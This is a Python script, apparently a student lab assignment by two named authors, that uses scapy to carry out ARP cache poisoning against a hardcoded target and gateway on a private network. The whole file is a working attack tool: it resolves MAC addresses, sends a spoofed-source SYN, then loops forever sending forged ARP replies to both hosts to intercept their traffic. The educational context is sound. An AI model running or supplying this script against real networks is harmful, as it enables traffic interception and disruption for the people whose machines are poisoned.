"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

ARP cache poisoning

This script will try to poison the ARP cache of the target machine and the gateway. For more information, see the README.md file.

Usage : python3 main.py
"""

from scapy.all import *


def get_mac(targetip):
    """Get the MAC address of the target machine"""
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    target_mac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac


def spoof_arp_cache(targetip, target_mac, sourceip):
    """Spoof the ARP cache of the target machine"""
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=target_mac)
    send(spoofed, verbose=False)


def craft_packet_target_ip(hostip, targetip):
    """Craft a packet with a spoofed source IP address to send to the target machine"""
    ip = IP(dst=hostip, src=targetip)
    tcp = TCP(dport=80, sport=RandShort(), flags="S")
    packet = ip / tcp
    send(packet)


def main():
    hostip = "10.12.0.10"
    targetip = "10.1.0.3"
    gatewayip = "10.1.0.1"

    # Send a packet to the target to make sure it is in the ARP cache
    craft_packet_target_ip(hostip, targetip)

    try:
        target_mac = get_mac(targetip)
        print("Target MAC", target_mac)
    except:
        print("Target machine did not respond to ARP broadcast")
        return

    try:
        gatewaymac = get_mac(gatewayip)
        print("Gateway MAC:", gatewaymac)
    except:
        print("Gateway is unreachable")
        return
    try:
        print("Sending spoofed ARP responses")
        while True:
            spoof_arp_cache(targetip, target_mac, gatewayip)
            spoof_arp_cache(gatewayip, gatewaymac, targetip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        return


if __name__ == "__main__":
    main()
